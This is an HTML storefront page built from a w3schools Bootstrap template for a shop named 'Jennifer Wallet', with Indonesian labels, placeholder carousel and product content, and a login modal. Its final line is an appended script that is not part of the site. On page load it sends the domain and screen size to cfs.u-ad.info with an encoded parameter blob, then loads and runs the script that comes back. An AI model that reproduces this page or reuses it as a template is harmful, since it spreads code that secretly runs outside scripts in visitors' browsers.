
<!DOCTYPE html>
<html lang="en">
<head>
  <!-- Theme Made By www.w3schools.com - No Copyright -->
  <title>Bootstrap Theme Company Page</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <link rel="stylesheet" href="css/bootstrap.css">
  <link rel="stylesheet" href="css/bootstrap.min.css">
 
  
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
   <link rel="stylesheet" href="css/home_style.css">
</head>
  <style>

  h2 {
      font-size: 24px;
      text-transform: uppercase;
      color: #303030;
      font-weight: 600;
      margin-bottom: 30px;
  }
  h4 {
      font-size: 19px;
      line-height: 1.375em;
      color: #303030;
      font-weight: 400;
      margin-bottom: 30px;
  }  
  .jumbotron {
      background-color: #f4511e;
      color: #fff;
      padding: 100px 25px;
      font-family: Montserrat, sans-serif;
  }
  .container-fluid {
      padding: 60px 50px;
  }
  .bg-grey {
      background-color: #f6f6f6;
  }
  .logo-small {
      color: #f4511e;
      font-size: 50px;
  }
  .logo {
      color: #f4511e;
      font-size: 200px;
  }
  .thumbnail {
      padding: 0 0 15px 0;
      border: none;
      border-radius: 0;
  }
  .thumbnail img {
      width: 100%;
      height: 100%;
      margin-bottom: 10px;
  }
  .carousel-control.right, .carousel-control.left {
      background-image: none;
      color: #f4511e;
  }
  .carousel-indicators li {
      border-color: #f4511e;
  }
  .carousel-indicators li.active {
      background-color: #f4511e;
  }
  .item h4 {
      font-size: 19px;
      line-height: 1.375em;
      font-weight: 400;
      font-style: italic;
      margin: 70px 0;
  }
  .item span {
      font-style: normal;
  }
  .panel {
      border: 1px solid #f4511e; 
      border-radius:0 !important;
      transition: box-shadow 0.5s;
  }
  .panel:hover {
      box-shadow: 5px 0px 40px rgba(0,0,0, .2);
  }
  .panel-footer .btn:hover {
      border: 1px solid #f4511e;
      background-color: #fff !important;
      color: #f4511e;
  }
  .panel-heading {
      color: #fff !important;
      background-color: #f4511e !important;
      padding: 25px;
      border-bottom: 1px solid transparent;
      border-top-left-radius: 0px;
      border-top-right-radius: 0px;
      border-bottom-left-radius: 0px;
      border-bottom-right-radius: 0px;
  }
  .panel-footer {
      background-color: white !important;
  }
  .panel-footer h3 {
      font-size: 32px;
  }
  .panel-footer h4 {
      color: #aaa;
      font-size: 14px;
  }
  .panel-footer .btn {
      margin: 15px 0;
      background-color: #f4511e;
      color: #fff;
  }
  .navbar {
      margin-bottom: 0;
      background-color: #f4511e;
      z-index: 9999;
      border: 0;
      font-size: 12px !important;
      line-height: 1.42857143 !important;
      border-radius: 0;
  }
  .navbar li a, .navbar .navbar-brand {
      color: #fff !important;
  }
  .navbar-nav li a:hover, .navbar-nav li.active a {
      color: #f4511e !important;
      background-color: #fff !important;
  }
  .navbar-default .navbar-toggle {
      border-color: transparent;
      color: #fff !important;
  }
  .navbar-nav ul{
	  background:#099;
  }
  footer .glyphicon {
      font-size: 20px;
      margin-bottom: 20px;
      color: #f4511e;
  }
  .slideanim {visibility:hidden;}
  .slide {
      animation-name: slide;
      -webkit-animation-name: slide;	
      animation-duration: 1s;	
      -webkit-animation-duration: 1s;
      visibility: visible;			
  }
  .carousel-inner > .item > img,
  .carousel-inner > .item > a > img {
      width: 1700px;
      margin: auto;
	  height:280px;
	  background:#0FC;
  }
 
.carousel,
.item,
.active,
.slide, {
	width: 100%;
    height: 100%;
}
.corousel-indicators,
.carousel-inner {
    height: 100%;
}
  @keyframes slide {
    0% {
      opacity: 0;
      -webkit-transform: translateY(70%);
    } 
    100% {
      opacity: 1;
      -webkit-transform: translateY(0%);
    }	
  }
  @-webkit-keyframes slide {
    0% {
      opacity: 0;
      -webkit-transform: translateY(70%);
    } 
    100% {
      opacity: 1;
      -webkit-transform: translateY(0%);
    }
  }
  @media screen and (max-width: 768px) {
    .col-sm-4 {
      text-align: center;
      margin: 25px 0;
    }
    .btn-lg {
        width: 100%;
        margin-bottom: 35px;
    }
  }
  @media screen and (max-width: 480px) {
    .logo {
        font-size: 150px;
    }
  }
  </style>
</head>
<body id="myPage" data-spy="scroll" data-target=".navbar" data-offset="60">

<nav class="navbar navbar-default navbar-fixed-top">
  <div class="container">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>                        
      </button>
      <a class="navbar-brand" href="#myPage">Logo</a>
    </div>
    <div class="collapse navbar-collapse text-center" id="myNavbar">
      <ul class="nav navbar-nav">
        <li><a href="#about">ABOUT</a></li>
        <li><a href="#services">SERVICES</a></li>
        <li><a href="#produk">Product</a></li>
        <li><a href="#pricing">PRICING</a></li>
        <li><a href="#contact">CONTACT</a></li>
<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Section 4 <span class="caret"></span></a>
            <ul class="dropdown-menu">
              <li><a href="#section41">Section 4-1</a></li>
              <li><a href="#section42">Section 4-2</a></li>
            </ul>
          </li>
      </ul>
      
  
    </div>
  </div>
</nav>
<!-- END OF NAVBAR -->

<!-- FORM CART N LOGIN-->
<div style="clear:both"><h1>&nbsp;</h1></div>

<div class="row-fluid">
<div class="row" style="background:#036">
<br>
<div class="col-sm-3">
  <div class="col-sm-5">
<label class="badge badge-message">Jennifer Wallet</label>
  </div>
</div>

<div class="col-sm-7">
    <form class="form-inline" method="post" action="hai.php">
  <div class="col-sm-5">
      <input type="text" class="form-control" size="70" placeholder="product search" required>
      </div>
      <div class="col-sm-3">
     <label></label>
  </div>
    
     <div class="col-sm-2">
      <button type="submit" class="btn btn-danger"><i class="glyphicon glyphicon-search"></i></button>
  </div>
  </form>
</div>

<div class="col-sm-2 pull-right">
  <!-- NAVBAR RIGHT -->
          <ul class="nav navbar-nav navbar-right">
        <li><a href="#"><span class="glyphicon glyphicon-user"></span> Daftar baru</a></li>
         <li><a href="#" data-toggle="modal" data-target="#myModal"><span class="glyphicon glyphicon-log-in"></span>Login</a></li>
      </ul>
     
</div>

</div>
</div>
<!-- END OF CART N OGIN AREA -->

<!-- COROUSEL -->
<div id="myCarousel" class="carousel slide" data-ride="carousel">
    <!-- Indicators -->
    <ol class="carousel-indicators">
      <li data-target="#myCarousel" data-slide-to="0" class="active"></li>
      <li data-target="#myCarousel" data-slide-to="1"></li>
      <li data-target="#myCarousel" data-slide-to="2"></li>
      <li data-target="#myCarousel" data-slide-to="3"></li>
    </ol>

    <!-- Wrapper for slides -->
    <div class="carousel-inner" role="listbox">

      <div class="item active">
        <img src="assets/2.jpg" alt="Chania" width="460" height="200">
        <div class="carousel-caption">
          <h3>Chania</h3>
          <p>The atmosphere in Chania has a touch of Florence and Venice.</p>
        </div>
      </div>

      <div class="item">
        <img src="assets/1.jpg" alt="Chania" width="460" height="200">
        <div class="carousel-caption">
          <h3>Chania</h3>
         <p>The atmosphere in Chania has a touch of Florence and Venice.</p>
        </div>
      </div>
    
      <div class="item">
        <img src="assets/2.jpg" alt="Flower" width="460" height="200">
        <div class="carousel-caption">
          <h3>Flowers</h3>
          <p>Beatiful flowers in Kolymbari, Crete.</p>
        </div>
      </div>

      <div class="item">
        <img src="assets/1.jpg" alt="Flower" width="460" height="200">
        <div class="carousel-caption">
          <h3>Flowers</h3>
          <p>Beatiful flowers in Kolymbari, Crete.</p>
        </div>
      </div>
  
    </div>

  </div>
<!-- END OF COROUSEL -->

<!-- Product or Content Section -->
<div id="produk" class="container-fluid text-center bg-grey" style="background:#EBEBEB">
  <div class="row text-center slideanim">
    <div class="col-sm-3">
      <div class="thumbnail">
        <img src="assets/1.jpg" alt="Paris" width="400" height="300">
        <p><strong>Paris</strong></p>
        <p>Yes, we built Paris</p>
      </div>
    </div>
    <div class="col-sm-3">
      <div class="thumbnail">
        <img src="assets/2.jpg" alt="New York" width="400" height="300">
        <p><strong>New York</strong></p>
        <p>We built New York</p>
      </div>
    </div>
    <div class="col-sm-3">
      <div class="thumbnail">
        <img src="assets/2.jpg" alt="New York" width="400" height="300">
        <p><strong>New York</strong></p>
        <p>We built New York</p>
      </div>
    </div>
    <div class="col-sm-3">
      <div class="thumbnail">
        <img src="assets/2.jpg" alt="New York" width="400" height="300">
        <p><strong>New York</strong></p>
        <p>We built New York</p>
      </div>
    </div>    
    <div class="col-sm-3">
      <div class="thumbnail">
        <img src="assets/1.jpg" alt="San Francisco" width="400" height="300">
        <p><strong>San Francisco</strong></p>
        <p>Yes, San Fran is ours</p>
      </div>
    </div>
  </div>
</div>

<!-- Container (Services Section) -->
<div id="services" class="container-fluid text-center">
  <h2>SERVICES</h2>
  <h4>What we offer</h4>
  <br>
  <div class="row slideanim">
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-off logo-small"></span>
      <h4>POWER</h4>
      <p>Lorem ipsum dolor sit amet..</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-heart logo-small"></span>
      <h4>LOVE</h4>
      <p>Lorem ipsum dolor sit amet..</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-lock logo-small"></span>
      <h4>JOB DONE</h4>
      <p>Lorem ipsum dolor sit amet..</p>
    </div>
  </div>
  <br><br>
  <div class="row slideanim">
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-leaf logo-small"></span>
      <h4>GREEN</h4>
      <p>Lorem ipsum dolor sit amet..</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-certificate logo-small"></span>
      <h4>CERTIFIED</h4>
      <p>Lorem ipsum dolor sit amet..</p>
    </div>
    <div class="col-sm-4">
      <span class="glyphicon glyphicon-wrench logo-small"></span>
      <h4 style="color:#303030;">HARD WORK</h4>
      <p>Lorem ipsum dolor sit amet..</p>
    </div>
  </div>
</div>




<!-- Container (Pricing Section) -->


<!-- Container (Contact Section) -->
<div id="contact" class="container-fluid bg-grey" style="background:#0A5">
  <h2 class="text-center">CONTACT</h2>
  <div class="row">
    <div class="col-sm-5">
      <p>Contact us and we'll get back to you</p>
      <p><span class="glyphicon glyphicon-map-marker"></span> Jennifer Wallet</p>
      <p><span class="glyphicon glyphicon-phone"></span> +035353453454</p>
      <p><span class="glyphicon glyphicon-envelope"></span> info@jenniferwallet.com</p>	   
    </div>
    <div class="col-sm-7 slideanim">
      <div class="row">
        <div class="col-sm-6 form-group">
          <input class="form-control" id="name" name="name" placeholder="Name" type="text" required>
        </div>
        <div class="col-sm-6 form-group">
          <input class="form-control" id="email" name="email" placeholder="Email" type="email" required>
        </div>
      </div>
      <textarea class="form-control" id="comments" name="comments" placeholder="Comment" rows="5"></textarea><br>
      <div class="row">
        <div class="col-sm-12 form-group">
          <button class="btn btn-default pull-right" type="submit">Send</button>
        </div>
      </div>	
    </div>
  </div>
</div>


<footer class="container-fluid text-center" style="background:#400040">
  <a href="#myPage" title="To Top">
    <span class="glyphicon glyphicon-chevron-up"></span>
  </a>
  <p>jennifer wallet <a href="http://www.w3schools.com" title="jennifer wallet">www.jennifer wallet.com</a></p>		
</footer>



<!-- For modal -->
<!-- Modal -->

  <div class="col-sm-5 modal fade" id="myModal" role="dialog">
    <div class="modal-dialog">
    <form method="post" action="indexx.php">
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Modal Header</h4>
        </div>
        <div class="modal-body">
        
<div class="form-group">
         <label class="col-sm-3 control-label">Password</label>
         <div class="col-sm-9">
         <input name="ps" type="password" required class="form-control" id="persen" placeholder="password" value="">
         </div>
        <div class="clearfix"></div>
 </div>
 <div class="form-group">
         <label class="col-sm-3 control-label">Password</label>
         <div class="col-sm-9">
         <input name="ps" type="password" required class="form-control" id="persen" placeholder="password" value="">
         </div>
        <div class="clearfix"></div>
 </div>
 <div class="form-group">
         <label class="col-sm-3 control-label">Password</label>
         <div class="col-sm-9">
         <input name="ps" type="password" required class="form-control" id="persen" placeholder="password" value="">
         </div>
        <div class="clearfix"></div>
 </div>
 <div class="form-group">
         <label class="col-sm-3 control-label">Password</label>
         <div class="col-sm-9">
         <input name="ps" type="password" required class="form-control" id="persen" placeholder="password" value="">
         </div>
        <div class="clearfix"></div>
 </div>

 
 </div>
       
       
        
 <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
              <button type="submit" class="btn btn-primary">Login Now</button>

        </div>
      </div>
   </form>  
    </div>
  </div>


<script>
$(document).ready(function(){
  // Add smooth scrolling to all links in navbar + footer link
  $(".navbar a, footer a[href='#myPage']").on('click', function(event) {

    // Prevent default anchor click behavior
    event.preventDefault();

    // Store hash
    var hash = this.hash;

    // Using jQuery's animate() method to add smooth page scroll
    // The optional number (900) specifies the number of milliseconds it takes to scroll to the specified area
    $('html, body').animate({
      scrollTop: $(hash).offset().top
    }, 900, function(){
   
      // Add hash (#) to URL when done scrolling (default click behavior)
      window.location.hash = hash;
    });
  });
  
  // Slide in elements on scroll
  $(window).scroll(function() {
    $(".slideanim").each(function(){
      var pos = $(this).offset().top;

      var winTop = $(window).scrollTop();
        if (pos < winTop + 600) {
          $(this).addClass("slide");
        }
    });
  });
})
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bED2so3wojuFaZElErTcmmHk0M4%2f%2fMJ7ZktGM3n1NhoD2fhKauAwsL9U%2ffoEAjwRJmk88xEjyVUodTnaESQCnxARTBmynH6AKcT0YQk6S%2faHjnG5BQ4ajpYnq1Z55kOaj318tX0eBiC5v8eP5V5s1IX0rELheabFR5xXNQYWaNjqR6ibkdV2F3e%2fpaZZu86cwrNzHGGAGdGscYRqB29imk0OjVmXkK9gDq90nyvAT1KQn0MjdKA8KFPxRLKGq4n3x6qrUbxzkq%2bRhxM6rHgKh98I0FJY0mgBOBor48xFK374rrNPlZr7Wys7cps5AiQpyWOhY8nYsD5dOj30EgBaI4CxdsDVmhG%2b8PdhBM%2fhimQ7Gca37uT%2bWDhVL7j%2fvxCfkrZe44v4rCvv8yy0bwAKppkfR2ixZkhhCUOU2UZczLZvfJAy77BfTsKhIO3uWvr9ASNgZNvmoUsBUkH%2bwRhNwYuAjwp%2b0qyOGbKtcoSCw1vpHJfLADSGl1SSYChND3oTnd9xEILz5cTOigaxlJ%2fBwo4MtTl8Z3g3KkvaO%2bROWF8R6GELYtntJQ%2b%2fNavD4o82h" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>